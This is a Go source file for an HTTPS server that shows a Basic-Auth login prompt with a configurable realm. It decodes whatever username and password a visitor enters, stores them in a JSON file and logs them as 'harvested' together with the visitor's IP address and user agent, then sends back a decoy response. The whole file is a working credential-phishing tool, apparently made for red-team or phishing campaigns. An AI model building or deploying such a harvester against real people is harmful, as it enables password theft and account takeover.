package gp

import (
	"net/http"
	"strings"
	"encoding/base64"
	"log"
	"errors"
	"io/ioutil"
	"os"
	"encoding/json"
	"fmt"
	"time"
)

type AuthServer struct {
	credStore *JsonStore
	settings  Settings
}

var np = NeatPrint{}

func loadSettings(jsonFile string) Settings {
	file, _ := os.Open(jsonFile)
	decoder := json.NewDecoder(file)
	settings := Settings{}

	if err := decoder.Decode(&settings); err != nil {
		np.Error("Error loading settings files")
		log.Fatal("Server Error: ", err)
		os.Exit(1)
	}

	return settings
}

func newStore(jsonfile string) (*JsonStore, error) {
	store := JsonStore{
		filename:  jsonfile,
	}

	if _, err := os.Stat(store.filename); err == nil {
		return &store, nil
	}

	_, err := os.Create(store.filename)
	return &store, err
}

func StartNewServer(settingsFile string, credsFile string) {
	settings := loadSettings(settingsFile)
	credStore, err := newStore(credsFile)
	if err != nil {
		np.Error("Error initiliazing credential store: " + err.Error())
	}
	np.Event("Credential store initialized at: " + credsFile)

	listenOn := settings.IP + ":" + settings.Port
	srv := AuthServer{
		credStore: credStore,
		settings: settings,
	}

	np.Event("Starting HTTPS Auth Server on: " + listenOn)

	http.HandleFunc("/", srv.handler)
	httpErr := http.ListenAndServeTLS(listenOn, settings.SSLCert, settings.SSLKey, nil)
	if httpErr != nil {
		log.Fatal("Server Error: ", httpErr)
	}
}

func (srv *AuthServer) process(req *http.Request) (AuthInfo, error) {
	authInfo := AuthInfo{}
	auth := strings.SplitN(req.Header.Get("Authorization"), " ", 2)

	b64, err := base64.StdEncoding.DecodeString(auth[1])
	if err != nil {
		return authInfo, errors.New("Error Decoding Authorization Header")
	}

	creds := strings.SplitN(string(b64), ":", 2)
	if len(creds) != 2 && (creds[0] == "" || creds[1] == "") {
		return authInfo, errors.New("Missing Authorization Credentials")
	}

	authInfo = AuthInfo {
		Host: stripPort(req.Host),
		Request: req.RequestURI,
		UserAgent: req.UserAgent(),
		IPAddress:  stripPort(req.RemoteAddr),
		Username: creds[0],
		Password: creds[1],
	}

	return authInfo, nil
}

func (srv *AuthServer) handler(resp http.ResponseWriter, req *http.Request)  {
	if (len(strings.SplitN(req.Header.Get("Authorization"), " ", 2)) == 2) {
		authInfo, err := srv.process(req);
		if err != nil {
			np.Error(err.Error())
		} else {
			created, err := srv.credStore.AddObject(authInfo);
			if err != nil {
				np.Error("Error writing credentials: " + err.Error())
			}

			if created {
				np.Info("New credentials harvested!")
				srv.printAuth(authInfo)
			} else {
				np.Info("Duplicate credentials received for: " + authInfo.Username)
			}

			srv.writeResponse(resp)
			return
		}
	}

	stamp := time.Now().Local().Format("2006-01-02 15:04:05")
	reqInfo := fmt.Sprintf("Request Received at %s: %s https://%s%s",
		stamp , req.Method,  stripPort(req.Host),  req.RequestURI)
	np.Info(reqInfo)
	np.Info("Sending Basic Auth response to: " + stripPort(req.RemoteAddr))
	resp.Header().Set("WWW-Authenticate", `Basic realm="` + srv.settings.BasicRealm + `"`)
	resp.WriteHeader(401)
	resp.Write([]byte("401 Unauthorized\n"))
}

func (srv *AuthServer) writeResponse(resp http.ResponseWriter) {
	if len(srv.settings.ResponseHeaders) > 0 {
		for _, head := range srv.settings.ResponseHeaders {
			resp.Header().Set(head[0], head[1])
		}
	}

	resp.WriteHeader(srv.settings.ResponseStatus)
	if srv.settings.ResponseBody != "" {
		resp.Write([]byte(srv.settings.ResponseBody + "\n"))
		return
	}

	if srv.settings.ResponseFile != "" {
		file, _ := ioutil.ReadFile(srv.settings.ResponseFile)
		resp.Write(file)
		return
	}

	resp.Write([]byte("404 Not Found\n"))
	return
}

func stripPort(ip string) string {
	colon := strings.Index(ip, ":")
	if colon > 0 {
		return ip[:colon]
	}

	return ip
}

func (srv *AuthServer) printAuth(auth AuthInfo) {
	np.Data("[HTTP]", "Host", auth.Host)
	np.Data("[HTTP]", "Request", auth.Request)
	np.Data("[HTTP]", "User Agent", auth.UserAgent)
	np.Data("[HTTP]", "IP Address", auth.IPAddress)
	np.Data("[AUTH]", "Username", auth.Username)
	np.Data("[AUTH]", "Password", auth.Password)
}